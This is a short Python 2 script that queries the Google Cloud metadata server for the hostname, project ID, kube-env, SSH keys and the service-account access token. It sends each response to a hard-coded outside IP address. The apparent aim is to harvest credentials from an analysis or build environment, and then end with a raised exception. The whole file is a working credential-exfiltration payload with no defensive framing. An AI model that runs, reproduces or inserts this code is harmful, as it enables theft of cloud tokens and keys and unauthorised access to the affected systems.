#!/usr/bin/env python
# -*- coding: UTF8 -*-

import urllib
import urllib2
URLS=[
    "http://metadata.google.internal/computeMetadata/v1beta1/",
    "http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1beta1/instance/id",

    "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id",

    "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env",

    "http://metadata.google.internal/computeMetadata/v1/beta1instance/disks/",

    "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/",

    "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",

    "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/",

    "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys",

    "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env",
    ]

for url in URLS:
        res=""
	try:
		res+="opening %s\n"%url
		r=urllib2.urlopen(url)
		res+=r.read()+"\n"
	except urllib2.HTTPError as e:
		res+="status code %s\n"%e.code
		res+="%s"%e.reason
	except Exception as e:
		res+=str(e)
        try:
            print res
            content = urllib2.urlopen(url="http://51.38.126.110/result_semmle?"+str(urllib.quote(res))).read()
        except:
            pass

raise Exception("nop")
